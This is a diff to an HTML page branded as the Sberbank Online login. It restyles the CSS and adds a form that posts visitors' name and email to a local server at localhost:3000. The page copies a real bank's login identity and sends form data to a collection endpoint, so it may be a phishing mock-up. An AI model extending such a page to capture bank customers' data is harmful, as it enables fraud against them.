@@ -4,56 +4,65 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Вход в СберБанк Онлайн</title>
-    <style>
-    body {
-        font-family: Arial, sans-serif;
-        margin: 0;
-        padding: 0;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        background-color: #f0f0f0;
-    }
+   <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
 
-    h1 {
-        text-align: center;
-    }
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
 
-    form {
-        display: flex;
-        flex-direction: column;
-        width: 300px;
-        background-color: white;
-        padding: 20px;
-        border-radius: 8px;
-        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-    }
+        h1 {
+            text-align: center;
+        }
 
-    label {
-        margin-bottom: 5px;
-    }
+        label {
+            margin-bottom: 8px;
+            font-size: 16px;
+        }
 
-    input {
-        padding: 10px;
-        margin-bottom: 10px;
-        border: 1px solid #ddd;
-        border-radius: 4px;
-    }
+        input {
+            padding: 10px;
+            margin-bottom: 15px;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
 
-    button {
-        padding: 10px;
-        background-color: #4CAF50;
-        color: white;
-        border: none;
-        border-radius: 4px;
-        cursor: pointer;
-    }
+        button {
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 400px;
+        }
 
-    button:hover {
-        background-color: #45a049;
-    }
-</style>
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
   <style>
     * {
@@ -376,6 +385,48 @@
   </script>
 </head>
 <body>
+  <div class="container">
+        <h1>Форма для отправки данных</h1>
+        <form id="myForm">
+            <label for="name">Имя:</label>
+            <input type="text" id="name" name="name" required><br>
+
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required><br>
+
+            <button type="submit">Отправить</button>
+        </form>
+    </div>
+
+    <script>
+        // Код для отправки данных на сервер при отправке формы
+        document.getElementById('myForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Предотвращаем отправку формы по умолчанию
+
+            const data = {
+                name: document.getElementById('name').value,
+                email: document.getElementById('email').value
+            };
+
+            fetch('http://localhost:3000/save-data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Данные успешно отправлены');
+                } else {
+                    console.error('Ошибка при отправке данных');
+                }
+            })
+            .catch(error => {
+                console.error('Ошибка: ', error);
+            });
+        });
+    </script>
   <div class="login-container">
     <div class="logo">
       <img src="sber.png" alt="СберБанк">
